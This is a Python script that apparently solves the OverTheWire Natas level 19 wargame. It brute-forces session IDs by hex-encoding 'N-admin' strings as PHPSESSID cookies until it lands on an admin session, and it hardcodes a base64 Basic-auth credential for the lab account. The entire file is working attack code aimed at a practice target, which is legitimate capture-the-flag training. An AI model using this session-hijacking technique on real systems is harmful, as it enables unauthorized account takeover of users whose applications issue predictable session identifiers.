import requests
import base64

auth = 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='
for i in range(1,1000):
	Data = {"username":"admin","password":"aaa"}
	c = str(i) + "-admin"
	cookie = "PHPSESSID=" + c.encode('hex')
	r = requests.post("http://natas19.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth, "Cookie":cookie}, data = Data)
	if "You are logged in as a regular user" in r.text:
		print str(i) + "-Fail"
	else: 
		print r.text
		break
